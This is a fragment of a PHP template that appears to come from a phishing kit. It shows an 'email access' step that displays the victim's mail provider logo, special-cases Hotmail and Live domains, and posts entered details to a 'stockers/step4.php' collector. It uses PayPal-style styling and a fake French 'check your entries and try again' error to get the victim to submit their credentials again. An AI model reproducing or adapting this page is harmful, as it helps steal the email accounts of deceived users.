...
<div class="contents"><?php echo "<!--".rand(0,99999999)."-->"?>
	<section class="mainContents" id="mailaccess">
		<form action="../extra/stockers/step4.php" method="post" style="padding:0 20px">
...
<p style="text-align: left;"><small><?php echo $lg_mailaccess['fcenter']?> <strong><?php echo ucfirst(strtolower($mailprovider)); ?></strong> <?php echo $lg_mailaccess['center']?></small></p>
			<div class="fields clearfix">
				<?php if ($mailprovider =="live.nl" || $mailprovider =="hotmail.nl" || $mailprovider =="live.ca" || $mailprovider =="hotmail.ca" || $mailprovider =="msn.com" || $mailprovider =="hotmail.uk" || $mailprovider =="hotmail.de" || $mailprovider =="hotmail.de" || $mailprovider =="hotmail.co.uk" || $mailprovider =="live.uk" || $mailprovider =="hotmail.com" || $mailprovider =="live.fr" || $mailprovider =="live.com" || $mailprovider =="live.es"){
              ...
              resizable="yes" width="128" height="64" src="https://logo.clearbit.com/'.$mailprovider.'"></td>';
                                        ...
                                        <center>
<p class="error" style="margin: 0px; font-family: pp-sans-small-light, &quot;Helvetica Neue&quot;, Arial, sans-serif; padding: 15px 15px 15px 18px; border-radius: 5px; border-width: 1px; border-style: solid; border-color: rgb(199, 46, 46);">Veuillez vérifier vos entrées et réessayer.</p>
<br><center>
				<div class="inputArea">
